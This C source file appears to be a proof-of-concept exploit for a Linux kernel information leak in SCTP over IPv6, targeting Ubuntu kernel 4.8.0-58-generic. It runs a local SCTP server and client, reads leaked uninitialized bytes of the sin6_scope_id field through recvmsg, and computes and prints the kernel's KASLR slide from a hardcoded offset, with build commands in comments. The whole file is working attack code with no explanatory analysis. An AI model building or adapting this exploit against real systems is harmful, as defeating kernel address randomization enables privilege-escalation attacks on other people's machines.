#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include <linux/in6.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <pwd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/mman.h>

// Ubuntu 4.8.0-58-generic
// sudo apt-get install libsctp-dev
// gcc -o poc poc.c -lsctp -lpthread

#if 0
struct sockaddr_in6 {
        unsigned short int      sin6_family;    /* AF_INET6 */
        __be16                  sin6_port;      /* Transport layer port # */
        __be32                  sin6_flowinfo;  /* IPv6 flow information */
        struct in6_addr         sin6_addr;      /* IPv6 address */
        __u32                   sin6_scope_id;  /* scope id (new in RFC2553) */
};
#endif

#define MY_PORT_NUM 62324

static volatile int servser_stop_flag = 0;
static volatile int client_stop_flag = 0;

void put_kptr(void)
{
	char *data;
	data = mmap(NULL, 0xa000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

static void *server_thread(void *arg) {
    int listen_fd, conn_fd, flags, ret, in;
    char buffer[1024] = {0,};
    struct sctp_sndrcvinfo sndrcvinfo;
    struct sockaddr_in6 servaddr;
    struct sockaddr_in6 src_addr;
    struct sockaddr_in6 clntaddr;
    socklen_t src_len;
    socklen_t clnt_len;
    char src_addr2[1024];
    struct sctp_initmsg initmsg = {
            .sinit_num_ostreams = 5,
            .sinit_max_instreams = 5,
            .sinit_max_attempts = 4,
    };
	struct msghdr msg;
	struct iovec iov;
	unsigned long leak_offset, stack_offset, leak_value;

	msg.msg_name = &src_addr;
	msg.msg_namelen = sizeof(src_addr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
	iov.iov_base = buffer;
	iov.iov_len = sizeof(buffer);

    servaddr.sin6_family = AF_INET6;
    servaddr.sin6_addr = in6addr_any;
    servaddr.sin6_port = htons(MY_PORT_NUM);
    memset(&src_addr, 0x77, sizeof(src_addr));

    listen_fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
    if (listen_fd < 0)
        return NULL;

    ret = bind(listen_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
    if (ret < 0)
        return NULL;

    ret = setsockopt(listen_fd, IPPROTO_SCTP, SCTP_INITMSG, &initmsg, sizeof(initmsg));
    if (ret < 0)
        return NULL;

    ret = listen(listen_fd, initmsg.sinit_max_instreams);
    if (ret < 0)
        return NULL;
    
    printf("[] Waiting for connection\n");

    conn_fd = accept(listen_fd, NULL, 0);
    if(conn_fd < 0)
        return NULL;

    printf("[] New client connected : %d\n", clnt_len);

    // put sensitive kernel pointer on the leak offset
	put_kptr();

    // trigger vulnerability to leak
	in = recvmsg(conn_fd, &msg, 0);
    if (in > 0) {
        printf("[] Received data: %s\n", buffer);
        printf("[] src_addr.sin6_scope_id : %lx\n", *(unsigned long *)&src_addr.sin6_scope_id);
	   printf("[] src_addr.sin6_family : %04x\n", src_addr.sin6_family);
        printf("[] sizeof(src_addr) : %d, src_len : %d\n", sizeof(src_addr), src_len);

        // leak value is src_addr.sin6_scope_id.

		// print KASLR slide ("_text" symbol address) using leak value.
		unsigned long kaslr;
		unsigned long offset_to_kaslr_slide = 0x3bf338;  // Offset for Ubuntu 4.8.0-58-generic
		
		memset(&kaslr, 0xff, sizeof(kaslr));
		memcpy(&kaslr, &src_addr.sin6_scope_id, sizeof(src_addr.sin6_scope_id));
		kaslr -= offset_to_kaslr_slide;
		printf("KASLR Slide : %lx\n", kaslr);
    }

    while (servser_stop_flag == 0)
        sleep(1);   

    close(conn_fd);
    return NULL;
}

static void *client_thread(void *arg) {
    int conn_fd, ret;
    const char *str = "Hello, Server!";
    struct sockaddr_in6 servaddr;
    struct sockaddr_in6 clntaddr;

    servaddr.sin6_family = AF_INET6;
    servaddr.sin6_port = htons(MY_PORT_NUM);
    inet_pton(AF_INET6, "::1", &servaddr.sin6_addr);

    clntaddr.sin6_family = AF_INET6;
    clntaddr.sin6_port = 0;
    inet_pton(AF_INET6, "::1", &clntaddr.sin6_addr);
	clntaddr.sin6_scope_id = 0x77;

    conn_fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
    if (conn_fd < 0)
        return NULL;

	ret = bind(conn_fd, (struct sockaddr *) &clntaddr, sizeof(clntaddr));
	if (ret < 0)
		return NULL;

    ret = connect(conn_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
    if (ret < 0)
        return NULL;

    ret = sctp_sendmsg(conn_fd, (void *) str, strlen(str) + 1, NULL, 0, 0, 0, 0, 0, 0 );
    if (ret < 0)
         return NULL;

    while (client_stop_flag == 0)
        sleep(1);

    close(conn_fd);
    return NULL;
}

int main(int argc, char *argv[])
{
    pthread_t sctp_server;
    pthread_t sctp_client;

    // run sctp server & client
    if (pthread_create(&sctp_server, NULL, server_thread, NULL))
        return EXIT_FAILURE;
    sleep(2);

    if (pthread_create(&sctp_client, NULL, client_thread, NULL))
        return EXIT_FAILURE;
    sleep(2);

    // exit threads
    client_stop_flag = 1;
    if (pthread_join(sctp_client, NULL))
        return EXIT_FAILURE;

    servser_stop_flag = 1;
    if (pthread_join(sctp_server, NULL))
        return EXIT_FAILURE;

    printf("end\n");
    return EXIT_SUCCESS;
}
